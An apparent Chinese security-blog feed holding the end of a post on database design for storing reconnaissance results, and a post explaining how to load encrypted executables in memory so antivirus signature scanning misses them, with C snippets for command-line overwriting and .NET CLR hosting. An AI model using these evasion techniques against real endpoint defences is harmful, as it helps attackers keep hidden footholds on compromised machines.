&lt;p&gt;举个例子，假设一个表中有一列叫出生年月日，每人的这列数据都分为3个格子（年、月、日），那这种数据库就不符合1NF。而事实上1NF是关系型数据库的基本要求，这也代表着如果你这么设计数据表的话那这种操作一定是不会成功的。&lt;/p&gt;

&lt;h2 id=&quot;2nf&quot;&gt;2NF&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;2NF是对记录的&lt;strong&gt;惟一性&lt;/strong&gt;，要求记录有惟一标识，即实体的惟一性，即不存在部分依赖；&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;2NF在1NF的基础上消除了非主属性对于码的部分函数依赖，简单来讲就是非主键字段必须完全依赖主键。假设一张表主键为（学号，课号），那么对于属性姓名来讲，只有学号才决定姓名而与课号无关，因此属性姓名对于主键为部分依赖，因此不符合2NF&lt;/p&gt;

&lt;h2 id=&quot;3nf&quot;&gt;3NF&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;3NF是对字段的&lt;strong&gt;冗余性&lt;/strong&gt;，要求任何字段不能由其他字段派生出来，它要求字段没有冗余，即不存在传递依赖；&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;3NF在2NF的基础之上，消除了非主属性对于码的传递函数依赖。如果一张表学号为主键，有属性学院名和学院主任，学号决定所属学院，所属学院决定学院主任。因此学院主任这个属性对主属性学号为传递依赖，不符合3NF&lt;/p&gt;

&lt;h2 id=&quot;bcnf&quot;&gt;BCNF&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;若关系模式R属于3NF，且关系模式中每一个决定因素都包含候选键，则为BCNF。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;BCNF不允许存在&lt;strong&gt;主属性&lt;/strong&gt;对于码的部分函数依赖与传递函数依赖。（实在想不出该怎么解释）&lt;/p&gt;

&lt;p&gt;当我们设计的数据库达到了BCNF范式的要求，那么这个设计可以说是相当不错的，虽然之后还有4NF、5NF，但是我们不作考虑。（不会）&lt;/p&gt;

&lt;h1 id=&quot;设计&quot;&gt;设计&lt;/h1&gt;

&lt;p&gt;首先要确定要存什么样的内容&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;项目属性&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;project_name：项目名称&lt;/li&gt;
      &lt;li&gt;domain：目标所有的域名&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;对于域名
    &lt;ul&gt;
      &lt;li&gt;ip_address:指向的ip&lt;/li&gt;
      &lt;li&gt;use_CDN:是否使用cdn&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;对于每台服务器
    &lt;ul&gt;
      &lt;li&gt;ip_address：目标所有的ip地址&lt;/li&gt;
      &lt;li&gt;open_port_id：目标ip开放的端口&lt;/li&gt;
      &lt;li&gt;port_service：目标ip端口上运行的服务&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;对于web服务
    &lt;ul&gt;
      &lt;li&gt;url：不用多说&lt;/li&gt;
      &lt;li&gt;web_fingerprint：目标web服务的指纹&lt;/li&gt;
      &lt;li&gt;title：web服务网页的标题&lt;/li&gt;
      &lt;li&gt;screenshot_path：web服务的截屏的存储路径&lt;/li&gt;
      &lt;li&gt;available_path：扫描出的web服务的路径&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;对于web服务的每个路径
    &lt;ul&gt;
      &lt;li&gt;state_code：各个路径的状态码&lt;/li&gt;
      &lt;li&gt;content-length：返回的内容长度&lt;/li&gt;
      &lt;li&gt;redirect：如果有重定向，重定向的位置&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;确定这些数据的关系（X -&amp;gt; Y 代表存在函数依赖且X函数决定Y）&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;domain -&amp;gt; project_name&lt;/li&gt;
  &lt;li&gt;domain -&amp;gt; ip_address&lt;/li&gt;
  &lt;li&gt;domain -&amp;gt; use_CDN&lt;/li&gt;
  &lt;li&gt;ip_address, open_port_id -&amp;gt; port_service&lt;/li&gt;
  &lt;li&gt;url -&amp;gt; web_fingerprint（考虑到会有虚拟主机所以加上domain）&lt;/li&gt;
  &lt;li&gt;url -&amp;gt; title&lt;/li&gt;
  &lt;li&gt;url -&amp;gt; screenshot_path&lt;/li&gt;
  &lt;li&gt;url, available_path -&amp;gt; state_code&lt;/li&gt;
  &lt;li&gt;url, available_path -&amp;gt; content-length&lt;/li&gt;
  &lt;li&gt;url, available_path -&amp;gt; redirect&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;根据关系来设计数据表&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;project_assets( domain [primary key ], project_name, ip_address, use_CDN)&lt;/li&gt;
  &lt;li&gt;server_information( ip_address [primary key ], open_port_id [primary_key ], port_service)&lt;/li&gt;
  &lt;li&gt;web_service( url [primary key ], web_fingerprint, title ,screenshot_path)&lt;/li&gt;
  &lt;li&gt;web_path_information( url [primary key ], available_path [primary_key ], state_code, content-length, redirect)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;一些参考资料&quot;&gt;一些参考资料&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/ybwang/archive/2010/06/04/1751279.html&quot;&gt;https://www.cnblogs.com/ybwang/archive/2010/06/04/1751279.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000013695030&quot;&gt;https://segmentfault.com/a/1190000013695030&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="information-gathering" /><summary type="html">对于渗透来说，信息收集的完整度决定了最后渗透的成功与否。当对一个大型目标进行渗透的过程中，信息收集的工作便变得繁重。尽管现在有诸多自动化工具为我们完成信息收集方方面面的工作，但是如何将这些工具串联起来？输入一个域名后就能自动进行各方面的收集（包括子域名，端口探测，web指纹，web路径等等），这是我所期望的效果。因此我想要实现一个框架，将各种工具组合到一起进行全自动的信息收集。 数据存储与数据库范式 在信息收集之后，我们应该如何存储这些收集来的数据？长久以来我都是对每一个项目单开一个文件夹，将扫描结果以文本的形式零散的存放进去。这样做既不便于整理也不便于查找。因此我产生了使用数据库的念头（事实上数据库不就是干这个用的嘛）。随之而来的问题是如何设计？我们知道数据库由库、表组成，表中是按照列名存储的一行一行数据，怎样的设计才能让我们的数据是简洁、结构清晰同时还方便查找，这时候就需要用到数据库范式。 数据库的设计范式是数据库设计所需要满足的规范，满足这些规范的数据库是简洁的、结构明晰的，同时，不会发生插入（insert）、删除（delete）和更新（update）操作异常。反之则是乱七八糟，不仅给数据库的编程人员制造麻烦，而且面目可憎，可能存储了大量不需要的冗余信息。 下面只对4个范式进行简单回顾。 1NF 1NF是对属性的原子性，要求属性具有原子性，不可再分解； 举个例子，假设一个表中有一列叫出生年月日，每人的这列数据都分为3个格子（年、月、日），那这种数据库就不符合1NF。而事实上1NF是关系型数据库的基本要求，这也代表着如果你这么设计数据表的话那这种操作一定是不会成功的。 2NF 2NF是对记录的惟一性，要求记录有惟一标识，即实体的惟一性，即不存在部分依赖； 2NF在1NF的基础上消除了非主属性对于码的部分函数依赖，简单来讲就是非主键字段必须完全依赖主键。假设一张表主键为（学号，课号），那么对于属性姓名来讲，只有学号才决定姓名而与课号无关，因此属性姓名对于主键为部分依赖，因此不符合2NF 3NF 3NF是对字段的冗余性，要求任何字段不能由其他字段派生出来，它要求字段没有冗余，即不存在传递依赖； 3NF在2NF的基础之上，消除了非主属性对于码的传递函数依赖。如果一张表学号为主键，有属性学院名和学院主任，学号决定所属学院，所属学院决定学院主任。因此学院主任这个属性对主属性学号为传递依赖，不符合3NF BCNF 若关系模式R属于3NF，且关系模式中每一个决定因素都包含候选键，则为BCNF。 BCNF不允许存在主属性对于码的部分函数依赖与传递函数依赖。（实在想不出该怎么解释） 当我们设计的数据库达到了BCNF范式的要求，那么这个设计可以说是相当不错的，虽然之后还有4NF、5NF，但是我们不作考虑。（不会） 设计 首先要确定要存什么样的内容 项目属性 project_name：项目名称 domain：目标所有的域名 对于域名 ip_address:指向的ip use_CDN:是否使用cdn 对于每台服务器 ip_address：目标所有的ip地址 open_port_id：目标ip开放的端口 port_service：目标ip端口上运行的服务 对于web服务 url：不用多说 web_fingerprint：目标web服务的指纹 title：web服务网页的标题 screenshot_path：web服务的截屏的存储路径 available_path：扫描出的web服务的路径 对于web服务的每个路径 state_code：各个路径的状态码 content-length：返回的内容长度 redirect：如果有重定向，重定向的位置 确定这些数据的关系（X -&amp;gt; Y 代表存在函数依赖且X函数决定Y） domain -&amp;gt; project_name domain -&amp;gt; ip_address domain -&amp;gt; use_CDN ip_address, open_port_id -&amp;gt; port_service url -&amp;gt; web_fingerprint（考虑到会有虚拟主机所以加上domain） url -&amp;gt; title url -&amp;gt; screenshot_path url, available_path -&amp;gt; state_code url, available_path -&amp;gt; content-length url, available_path -&amp;gt; redirect 根据关系来设计数据表 project_assets( domain [primary key ], project_name, ip_address, use_CDN) server_information( ip_address [primary key ], open_port_id [primary_key ], port_service) web_service( url [primary key ], web_fingerprint, title ,screenshot_path) web_path_information( url [primary key ], available_path [primary_key ], state_code, content-length, redirect) 一些参考资料 https://www.cnblogs.com/ybwang/archive/2010/06/04/1751279.html https://segmentfault.com/a/1190000013695030</summary></entry><entry><title type="html">使用内存加载躲避静态查杀</title><link href="https://citrusice.github.io/posts/memory-execute/" rel="alternate" type="text/html" title="使用内存加载躲避静态查杀" /><published>2020-02-28T15:34:38+08:00</published><updated>2020-02-28T15:34:38+08:00</updated><id>https://citrusice.github.io/posts/memory-execute</id><content type="html" xml:base="https://citrusice.github.io/posts/memory-execute/">&lt;p&gt;在进行后渗透阶段的过程中，首先要面临的问题就是免杀。如果服务器安装了反病毒软件，那不管是用马进行权限维持还是上传提权exp进行提权，甚至使用一些隧道工具（如ew）都将都到影响。如果是使用msf/cs等工具可以使用加载shellcode的方式进行免杀，但是涉及到一些常用工具的免杀就需要用修改源码、修改特征码的方式进行处理。这种处理不但烦琐而且不具有通用性，因此开发一种通用的工具来进行免杀是必要的。&lt;/p&gt;

&lt;p&gt;本文将只探讨思路，不涉及具体实现。&lt;/p&gt;

&lt;h1 id=&quot;特征码技术与免杀&quot;&gt;特征码技术与免杀&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;特征码技术：运用程序中某一段或几段64字节以下的代码作为判别程序病毒的主要依据&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;谈到杀毒软件就不得不说特征码技术，尽管历史悠久，但到目前为止仍是各大杀毒软件判断可执行程序的主要手段。shellcode分离免杀之所以能获得很好的效果就是因为shellcode加载器本身并不包含恶意代码，自然也不会包含恶意软件的特征码，而只有当加载器运行时，它才会从程序之外加载shellcode执行。&lt;/p&gt;

&lt;p&gt;借鉴shellcode分离免杀的思路，如果将pe文件以加密的形式存储，使用加载器读取pe文件并解密，最后放到内存中执行，那么程序的免杀性将大大地提高。实际上类似的技术早在至少08年就被提出过，叫做反射型dll注入（reflective dll injection），通过内存而不是从磁盘上加载dll。要实现从内存加载可执行程序并不困难，只要了解操作系统如何将exe加载到内存并编程重新实现就可以了。&lt;/p&gt;

&lt;h1 id=&quot;实现原理&quot;&gt;实现原理&lt;/h1&gt;

&lt;p&gt;exe程序被执行的过程：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;windows pe loader读取pe文件，检查pe文件的有效性。&lt;/li&gt;
  &lt;li&gt;根据pe文件头中的IMAGE_OPTIONAL_HEADER.SizeOfImage申请一块空间&lt;/li&gt;
  &lt;li&gt;pe loader将pe文件按IMAGE_OPTIONAL_HEADER.SectionAlignment展开，将pe文件装载到内存空间。&lt;/li&gt;
  &lt;li&gt;根据pe文件的导入表，pe loader将pe所需要的dll加载进地址空间并更新IAT&lt;/li&gt;
  &lt;li&gt;如果没有加载在pe文件中设定的ImageBase，需要使用重定位表进行重定位&lt;/li&gt;
  &lt;li&gt;跳到pe入口点&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;基本上只要实现了上述几个步骤就可以实现内存加载，但是具体实现的时候我还遇到了几个问题：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;如果PE文件不存在重定位表，应该如何加载&lt;/li&gt;
  &lt;li&gt;如何修改传给被加载程序的参数&lt;/li&gt;
  &lt;li&gt;如何加载.Net PE&lt;/li&gt;
  &lt;li&gt;如何加载x64程序&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;加载无重定位表的pe&quot;&gt;加载无重定位表的PE&lt;/h1&gt;

&lt;p&gt;关于重定位表：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;当加载器加载程序时，如果加载器为某PE（.exe、.dll）分配的基址与其自身默认记录的ImageBase不相同，那么该程序文件加载完毕后就需要修正重定位表中的所有需要修正的地址。如果加载器分配的基址和该程序文件中记录默认的ImageBase相同，则不需要修正，重定位表对于该dll也是没有效用的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;因此如果将PE加载在默认的位置则可以无需重定位表。我们将加载器的ImageBase设为其他地址，为没有重定位表的pe程序让出空间，随后用virtualloc在目标pe程序的默认基址处开辟一块内存用来放置目标pe程序，这样就可以避免考虑重定位的问题。&lt;/p&gt;

&lt;h1 id=&quot;修改传递给被加载程序的命令行参数&quot;&gt;修改传递给被加载程序的命令行参数&lt;/h1&gt;

&lt;p&gt;我对加载器的设想是传递一个目标pe文件路径参数给加载器，然后加载器通过路径进行加载。如果只是加载一些木马就不需要考虑命令行参数的问题，但是如果要加载一些工具那传递给加载器的参数就会污染传递给被加载pe文件的参数，因此需要考虑参数传递的问题。&lt;/p&gt;

&lt;h2 id=&quot;一个进程如何获得命令行参数&quot;&gt;一个进程如何获得命令行参数&lt;/h2&gt;

&lt;p&gt;一般进程获取到命令行参数的方法是通过windows api的GetCommandLine获取&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;LPSTR&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetCommandLineA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetCommandLineW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;有一个误区是很多人认为这个函数是从进程peb中获取到的参数，但实际上系统在加载进程时保存了一份命令行参数的拷贝在某个私有变量中，GetCommandLine都是从那个拷贝中获取，因此只有修改了拷贝的地址中的内容才有效。&lt;/p&gt;

&lt;h2 id=&quot;示例代码&quot;&gt;示例代码&lt;/h2&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pCommandLine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetCommandLineW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LPSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pCommandLineA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetCommandLineA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pCommandLineA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxCount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lstrlenW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pCommandLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;converted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mbstowcs_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;converted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pCommandLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxCount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;如何加载net程序&quot;&gt;如何加载.Net程序&lt;/h1&gt;

&lt;p&gt;PE实际上只是一种存储数据的方式，尽管都是PE文件，但是.Net程序与Win32程序还是有着本质的区别。要了解.Net，还要从CLR说起。&lt;/p&gt;

&lt;h2 id=&quot;common-language-runtime&quot;&gt;Common Language Runtime&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Common Language Runtime (CLR) is a complete, high level virtual machine designed to support a broad variety of programming languages and interoperation among them.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;em&gt;公共语言运行时（CLR）是一套完整的、高级的虚拟机，它被设计为用来支持不同的编程语言，并支持它们之间的互操作。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;正如 JRE 是 JAVA 的运行环境一样，CLR是.Net的运行环境，不同的是它可以为多种语言提供支持。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/20200227192210.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;著名的.Net体系&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;.Net程序经过编译器编译后，会生成一种中间语言——MSIL，执行时CLR再将他们翻译为真正的机器语言执行。因此我们不能像处理Win32程序一样处理.Net程序，而需要与CLR进行交互，将.Net程序交给CLR去执行。&lt;/p&gt;

&lt;h2 id=&quot;示例代码-1&quot;&gt;示例代码&lt;/h2&gt;

&lt;p&gt;加载.Net环境并执行.Net程序的代码很多，以下代码只是示范&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HRESULT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ICLRMetaHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pMetaHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ICLRRuntimeInfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pRuntimeInfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ICLRRuntimeHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pClrRuntimeHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// build runtime&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLRCreateInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLSID_CLRMetaHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IID_PPV_ARGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pMetaHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pMetaHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetRuntime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;v4.0.30319&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IID_PPV_ARGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pRuntimeInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pRuntimeInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLSID_CLRRuntimeHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;IID_PPV_ARGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// start runtime&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// execute managed assembly&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pReturnValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExecuteInDefaultAppDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;L&quot;T:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;FrameworkInjection&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;_build&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;anycpu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;InjectExample.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;L&quot;InjectExample.Program&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;L&quot;EntryPoint&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;L&quot;hello .net runtime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pReturnValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// free resources&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pMetaHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pRuntimeInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;加载x64程序&quot;&gt;加载x64程序&lt;/h1&gt;

&lt;p&gt;如果要图方便的话只要稍微修改一下代码重新编译一个x64的加载器就可以（事实上我就是这样做的），但如果我们追求极致，想让我们的加载器做到能同时加载32位和64位程序呢？理论上讲，如果我们的程序是32位的，那就没法执行64位的cpu指令，如果是64位的，同样也无法执行32位的cpu指令。想要实现在32位指令与64位指令的切换，就需要了解当我们在64位操作系统下执行了32位程序时，操作系统都做了哪些工作。&lt;/p&gt;

&lt;h2 id=&quot;windows-x64下的win32程序&quot;&gt;Windows x64下的Win32程序&lt;/h2&gt;

&lt;p&gt;在64位系统，任何进程中首先执行的代码是64位的ntdll.dll，它会初始化一个64位的进程。而稍后32位的应用程序将运行在一个名为WoW64的子系统下（说到子系统有没有想到WSL），这个子系统加载32位的ntdll.dll，将cpu转换为32位模式以执行Win32程序中的代码。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/20200227221306.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在x64系统下观察一个Win32程序，发现会同时加载了两个ntdll.dll，其中有一个处在64位的地址空间，这就是64位的ntdll.dll。32位的ntdll.dll并没有包含任何sysenter的指令，因此当Win32程序尝试通过32位的ntdll.dll与系统交互时，32位的ntdll.dll将参数转发给64位的ntdll.dll并再一次进行cpu的模式转换，回到64位完成这次系统调用。&lt;/p&gt;

&lt;p&gt;可以看到，在启动程序与系统调用的过程中，cpu分别发生了64到32与32到64两种转换，如果我们手动实现这一过程，那么我们的程序也可以在32位与64位指令中进行切换。&lt;/p&gt;

